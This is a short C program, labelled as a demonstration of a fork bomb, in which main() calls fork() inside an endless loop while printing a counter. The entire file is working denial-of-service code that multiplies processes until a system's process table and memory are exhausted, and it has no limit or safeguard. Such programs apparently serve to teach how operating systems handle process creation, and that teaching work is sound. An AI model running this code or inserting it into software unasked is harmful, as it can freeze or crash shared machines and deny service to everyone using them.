/*
 *	Program to demonstrate Fork Bomb. 
 *					
 */

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

int main(void) {
	int i = 0;

	while (1) {
		printf("-> %d\n", i++);
		fork();
	}
	return 0;
}
